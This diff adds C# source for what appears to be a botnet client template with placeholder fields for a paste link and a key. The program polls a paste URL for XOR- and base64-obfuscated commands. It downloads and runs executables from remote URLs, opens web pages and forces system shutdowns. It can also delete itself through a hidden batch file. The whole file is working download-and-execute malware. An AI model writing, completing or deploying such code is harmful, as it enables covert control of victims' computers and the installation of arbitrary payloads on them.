@@ -1,0 +1,98 @@
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace Client
+{
+    class Program
+    {
+	 static string ToBase(string enc)
+        {
+            return Convert.ToBase64String(Encoding.UTF8.GetBytes(enc));
+        }
+	static string EncryptOrDecrypt(string text, string key)
+        {
+            StringBuilder result = new StringBuilder();
+
+            for (int c = 0; c < text.Length; c++)
+                result.Append((char)((uint)text[c] ^ (uint)key[c % key.Length]));
+
+            return result.ToString();
+        }
+        static string link;
+        static void Main(string[] args)
+        {
+            link = "[pastelink-replace]";
+            Thread t = new Thread(Start);
+            t.Start();
+        }
+        static void Start()
+        {
+		try{
+            Random rnd = new Random();
+            WebClient wc = new WebClient();
+            string currenttext = "{{{{}}}}";
+			string key = "[key-replace]";
+            while (true)
+            {
+                string newtext = wc.DownloadString(link);
+                if (newtext != currenttext)
+                {
+                    string cmd = newtext.Replace(currenttext, "");
+                    currenttext = newtext;
+                    if (cmd.StartsWith("." + ToBase(EncryptOrDecrypt("d&e",key))))
+                    {
+                        string url = cmd.Split('|')[1];
+                        byte[] fbytes = wc.DownloadData(url);
+                        string temp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), rnd.Next(4343, 19022).ToString() + ".exe");
+                        File.WriteAllBytes(temp, fbytes);
+                        Process.Start(temp);
+                    }
+                    if (cmd.StartsWith("." + ToBase(EncryptOrDecrypt("visit",key))))
+                    {
+                        string url = cmd.Split('|')[1];
+                        Process.Start(url);
+                    }
+                    if (cmd.StartsWith("." + ToBase(EncryptOrDecrypt("shutdown",key))))
+                    {
+                        ProcessStartInfo psi = new ProcessStartInfo("shutdown", "/s /t 0");
+                        psi.CreateNoWindow = true;
+                        psi.UseShellExecute = false;
+                        Process.Start(psi);
+                    }
+                    if (cmd.StartsWith("." + ToBase(EncryptOrDecrypt("uninstall",key))))
+                    {
+                        ProcessStartInfo Info = new ProcessStartInfo();
+                        string temp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),rnd.Next(5634, 19022).ToString() + ".bat");
+                        File.WriteAllText(temp, "/C choice /C Y /N /D Y /T 3 & Del " +
+                                       Application.ExecutablePath);
+                        Info.WindowStyle = ProcessWindowStyle.Hidden;
+                        Info.CreateNoWindow = true;
+                        Info.FileName = temp; 
+                        Process.Start(Info);
+                    }
+                    if (cmd.StartsWith("." + ToBase(EncryptOrDecrypt("msgbox",key))))
+                    {
+                        string title = cmd.Split('|', '|')[1];
+                        string msg = cmd.Split('|')[2];
+                        MessageBox.Show(msg, title);
+                    }
+                    Thread.Sleep(1000);
+                    GC.Collect();
+					
+                }
+				
+            }
+			}
+					catch(Exception ex)
+					{
+					MessageBox.Show(ex.ToString());
+					}
+        }
+    }
+}
